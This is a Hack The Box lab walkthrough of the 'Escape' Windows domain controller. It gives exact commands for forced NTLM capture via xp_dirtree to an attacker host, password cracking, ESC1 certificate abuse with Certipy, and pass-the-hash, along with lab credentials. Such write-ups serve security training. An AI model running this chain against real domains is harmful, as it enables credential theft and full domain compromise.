# Hack The Box - Escape

![Hack The Box](https://img.shields.io/badge/Hack%20The%20Box-Escape-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black)
![Operating System](https://img.shields.io/badge/OS-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Active Directory](https://img.shields.io/badge/Focus-Active%20Directory-red?style=for-the-badge)

> **Escape** is a Medium-difficulty Windows Active Directory machine that demonstrates how several common misconfigurations can be chained together to compromise a Domain Controller. The attack begins with anonymous access to an SMB share, where sensitive MSSQL credentials are exposed. These credentials are used to force NTLM authentication, obtain access as a service account, move laterally to another domain user, and finally abuse an **ESC1-vulnerable Active Directory Certificate Services template** to impersonate the domain Administrator.

---

## Machine Information

| Property | Value |
|---|---|
| **Machine** | Escape |
| **Platform** | Hack The Box |
| **Operating System** | Windows |
| **Difficulty** | Medium |
| **Domain** | `sequel.htb` |
| **Hostname** | `dc.sequel.htb` |
| **Main Technologies** | SMB, MSSQL, WinRM, Kerberos, Active Directory Certificate Services |
| **Main Techniques** | NTLM Hash Capture, Password Cracking, Credential Reuse, ESC1, Certificate Authentication, Pass-the-Hash |

---

## Attack Path

```text
Anonymous SMB Access
        │
        ▼
Download SQL Server Procedures.pdf
        │
        ▼
Obtain MSSQL Credentials
        │
        ▼
Authenticate to MSSQL
        │
        ▼
Force NTLM Authentication with xp_dirtree
        │
        ▼
Capture sql_svc NTLMv2 Hash
        │
        ▼
Crack the Hash with John the Ripper
        │
        ▼
WinRM Access as sql_svc
        │
        ▼
Discover Credentials in MSSQL Logs
        │
        ▼
WinRM Access as ryan.cooper
        │
        ▼
Enumerate Active Directory Certificate Services
        │
        ▼
Identify ESC1-Vulnerable Certificate Template
        │
        ▼
Request a Certificate for Administrator
        │
        ▼
Authenticate with the Certificate
        │
        ▼
Recover the Administrator NT Hash
        │
        ▼
Pass-the-Hash through WinRM
        │
        ▼
Administrator Access
```

---

# 1. Reconnaissance

## Full TCP Port Scan

The first step was to perform a full TCP port scan to identify all services exposed by the target.

```bash
nmap -sS -sV -sC -p- --min-rate 5000 10.129.228.253 -oN nmap
```

After identifying the open ports, a second scan was performed using default Nmap scripts and service version detection.


<img width="952" height="827" alt="image" src="https://github.com/user-attachments/assets/71d81ff8-106c-4b40-8765-eb7d8227f8af" />



The scan revealed several services commonly associated with a Windows Active Directory environment:

- DNS
- Kerberos
- RPC
- LDAP
- SMB
- Microsoft SQL Server
- WinRM

The large number of Active Directory-related services indicated that the target was operating as a Domain Controller.

The Nmap output also revealed the following domain information:

```text
Domain: sequel.htb
Hostname: dc.sequel.htb
```

The domain and hostname were added to the local `/etc/hosts` file:

```bash
echo "10.129.228.253 sequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
```

---

# 2. SMB Enumeration

Since the target did not expose a web application, SMB was the first service selected for further enumeration.

The available SMB shares were listed using anonymous authentication:

```bash
smbclient -L //sequel.htb/
```

When prompted for a password, the field was left empty.

Among the available shares, the `Public` share allowed anonymous access.

```bash
smbclient //sequel.htb/Public
```

The contents of the share were listed:

```text
smb: \> ls
```

A PDF file named `SQL Server Procedures.pdf` was discovered.

The file was downloaded using:

```text
smb: \> get "SQL Server Procedures.pdf"
```

<img width="956" height="437" alt="image" src="https://github.com/user-attachments/assets/c13b860e-3fa0-4e52-b4a2-d318a42181f6" />




After reviewing the document, temporary credentials for the MSSQL service were found:

```text
Username: PublicUser
Password: GuestUserCantWrite1
```

The document exposed valid credentials that could be used to authenticate to the Microsoft SQL Server instance discovered during the initial Nmap scan.

---

# 3. MSSQL Enumeration

The recovered credentials were used to authenticate to the MSSQL service with Impacket:

```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```

<img width="954" height="215" alt="image" src="https://github.com/user-attachments/assets/7420d012-4c6f-44e3-b3b2-d966f982e669" />


Authentication was successful and provided access to the MSSQL console.

Initial database enumeration did not reveal any immediately useful information. However, the MSSQL service could potentially be forced to authenticate to an attacker-controlled SMB server through a UNC path.

If the MSSQL service was running under a domain user account, the resulting NTLM authentication could expose a crackable NTLMv2 hash.

---

# 4. Capturing the `sql_svc` NTLMv2 Hash

Responder was started on the Kali VPN interface to listen for incoming NTLM authentication attempts:

```bash
sudo responder -I tun0 -v
```

From the MSSQL console, the `xp_dirtree` stored procedure was used to request a directory listing from a UNC path pointing to the attacker machine:

```sql
EXEC MASTER.sys.xp_dirtree '\\10.10.14.65\test', 1, 1;
```

The MSSQL service attempted to authenticate to the attacker-controlled SMB server.

Responder successfully captured an NTLMv2 hash belonging to the `sql_svc` account.

<img width="956" height="839" alt="image" src="https://github.com/user-attachments/assets/e92b042a-4dc0-49b8-89e1-95b6146165fc" />


The captured hash was copied into a local file:

```bash
nano hash.txt
```

The password was then cracked with John the Ripper using the `rockyou.txt` wordlist:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The password was successfully recovered:

```text
Username: sql_svc
Password: REGGIE1234ronnie
```

---

# 5. Initial Access as `sql_svc`

The recovered credentials were tested against WinRM using Evil-WinRM:

```bash
evil-winrm -i sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
```

<img width="955" height="403" alt="image" src="https://github.com/user-attachments/assets/3aa4a44d-b24d-4cd6-a6f0-2a8c98f77798" />


Authentication was successful, providing a PowerShell session as the `sql_svc` user.

The available user directories were enumerated:

```powershell
Get-ChildItem C:\Users
```

A user named `Ryan.Cooper` was identified.

Further enumeration revealed an MSSQL backup log located at:

```text
C:\SQLServer\Logs\ERRORLOG.bak
```

The file was read using:

```powershell
type C:\SQLServer\Logs\ERRORLOG.bak
```

The log contained an authentication attempt made by `ryan.cooper`, exposing the following password:

```text
Username: ryan.cooper
Password: NuclearMosquito3
```

Although the authentication attempt had failed against the MSSQL service, the password could potentially have been reused for domain authentication.

---

# 6. Lateral Movement to `ryan.cooper`

The recovered credentials were tested against WinRM:

```bash
evil-winrm -i sequel.htb -u ryan.cooper -p 'NuclearMosquito3'
```

Authentication was successful, providing a PowerShell session as `ryan.cooper`.

<img width="953" height="225" alt="image" src="https://github.com/user-attachments/assets/24906e08-2b43-4d02-a16f-3e4b63e482ec" />


The user flag was located at:

```powershell
type C:\Users\Ryan.Cooper\Desktop\user.txt
```

At this point, a valid domain user had been compromised and the next objective was to identify a path to Domain Administrator privileges.

---

# 7. Active Directory Certificate Services Enumeration

The initial Nmap scan contained several certificate-related services, indicating that Active Directory Certificate Services might be installed.

`Certify.exe` was uploaded to the target through the Evil-WinRM session:

```text
*Evil-WinRM* PS> upload Certify.exe
```

The available Certificate Authorities were enumerated:

```powershell
.\Certify.exe cas
```

The output revealed the following Certificate Authority:

```text
sequel-DC-CA
```

Vulnerable certificate templates were then enumerated:

```powershell
.\Certify.exe find /vulnerable
```

The enumeration identified a vulnerable certificate template named:

```text
UserAuthentication
```

The template was vulnerable to **ESC1** because:

- `Authenticated Users` had enrollment permissions.
- The template allowed the enrollee to supply an arbitrary subject.
- The certificate could be used for client authentication.

This configuration allowed an authenticated domain user to request a certificate while specifying another domain identity through the Subject Alternative Name.

As a result, the `ryan.cooper` account could request a certificate for the `Administrator` account.

---

# 8. Privilege Escalation - ESC1

The vulnerable certificate template was exploited with Certipy.

Using the credentials of `ryan.cooper`, a certificate request was made while specifying `administrator@sequel.htb` as the alternative UPN:

```bash
certipy-ad req \
-u 'ryan.cooper@sequel.htb' \
-p 'NuclearMosquito3' \
-target 'sequel.htb' \
-ca 'sequel-DC-CA' \
-template 'UserAuthentication' \
-upn 'administrator@sequel.htb'
```

The request was successful and generated the following certificate:

```text
administrator.pfx
```

The generated PFX file contained authentication material associated with the `Administrator` account.

---

# 9. Kerberos Time Synchronization

The generated certificate was then used to authenticate as `Administrator`:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
```

However, Certipy returned the following error:

```text
KRB_AP_ERR_SKEW(Clock skew too great)
```

Kerberos is sensitive to clock differences and rejects authentication attempts when the time difference between the client and the Domain Controller exceeds the allowed limit.

The time of the Domain Controller was queried with:

```bash
sudo ntpdate -u 10.129.228.253
```

The time adjustment was initially unsuccessful because the Kali virtual machine was running under VirtualBox and `VBoxService` was automatically restoring the original system time.

The VirtualBox Guest Additions service was stopped:

```bash
sudo pkill VBoxService
```

Automatic NTP synchronization was also disabled:

```bash
sudo timedatectl set-ntp false
```

The Kali system clock was then manually adjusted to match the Domain Controller:

```bash
sudo date -s "<DC_DATE_AND_TIME>"
```

The updated time was verified:

```bash
date -u
```

After stopping the VirtualBox time synchronization process, the adjusted time remained stable and Kerberos authentication succeeded.

---

# 10. Certificate Authentication as Administrator

The generated certificate was used again with Certipy:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253
```

Certipy successfully performed PKINIT authentication and obtained a Kerberos Ticket Granting Ticket.

<img width="950" height="230" alt="image" src="https://github.com/user-attachments/assets/f2633259-5f4a-4a15-b85f-ec678f69ca48" />


The authentication process generated a Kerberos credential cache:

```text
administrator.ccache
```

Certipy also recovered the NTLM hash of the `Administrator` account in the following format:

```text
LM_HASH:NT_HASH
```

The returned value had the following structure:

```text
aad3b435b51404eeaad3b435b51404ee:<ADMINISTRATOR_NT_HASH>
```

The first value is the empty or disabled LM hash commonly found on modern Windows systems.

The second value is the NT hash and can be used directly for Pass-the-Hash authentication.

---

# 11. Pass-the-Hash as Administrator

The recovered Administrator NT hash was used to authenticate through WinRM:

```bash
evil-winrm -i 10.129.228.253 -u Administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```

Authentication was successful and provided an administrative PowerShell session:

<img width="950" height="185" alt="image" src="https://github.com/user-attachments/assets/24bcdda8-210e-4c85-84b7-fd10a0766271" />


```text
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

The root flag was located at:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

# Flags

```text
User Flag: HTB{REDACTED}

Root Flag: HTB{REDACTED}
```

---

# Key Takeaways

- Anonymous SMB access can expose sensitive internal documentation.
- Credentials discovered in documentation should be tested against all exposed services.
- MSSQL stored procedures such as `xp_dirtree` can be abused to force NTLM authentication.
- Service accounts may use weak or crackable passwords.
- Log files can expose sensitive information, including usernames and passwords.
- Password reuse can enable lateral movement between domain accounts.
- Active Directory Certificate Services should be carefully audited for insecure certificate templates.
- Certificate templates that allow arbitrary subject identities can be vulnerable to ESC1.
- An ESC1 vulnerability can allow a low-privileged domain user to request a certificate for a privileged account.
- Kerberos authentication requires accurate time synchronization.
- Virtual machine time synchronization can interfere with Kerberos-based attacks.
- Certificates can be used to obtain Kerberos tickets and recover NT hashes.
- Pass-the-Hash can provide administrative access without requiring the plaintext password.

---

# Tools Used

- Nmap
- SMBClient
- Impacket
- Responder
- John the Ripper
- Evil-WinRM
- Certify
- Certipy-ad
- NTPDate
- VirtualBox Guest Additions

---

# Techniques Used

```text
SMB Enumeration
Anonymous SMB Access
Sensitive File Disclosure
MSSQL Authentication
Forced NTLM Authentication
NTLMv2 Hash Capture
Password Cracking
Credential Reuse
WinRM Authentication
Log File Enumeration
Active Directory Certificate Services Enumeration
ESC1 Certificate Template Abuse
Certificate-Based Authentication
Kerberos PKINIT
Kerberos Time Synchronization
NTLM Hash Extraction
Pass-the-Hash
```

---

# References

- [Hack The Box - Escape](https://app.hackthebox.com/machines/Escape)
- [Certify - GhostPack](https://github.com/GhostPack/Certify)
- [Certipy](https://github.com/ly4k/Certipy)
- [SpecterOps - Certified Pre-Owned](https://specterops.io/blog/2021/06/17/certified-pre-owned/)

---

> This writeup was created for educational purposes and documents the exploitation of a retired Hack The Box machine in an authorized laboratory environment.
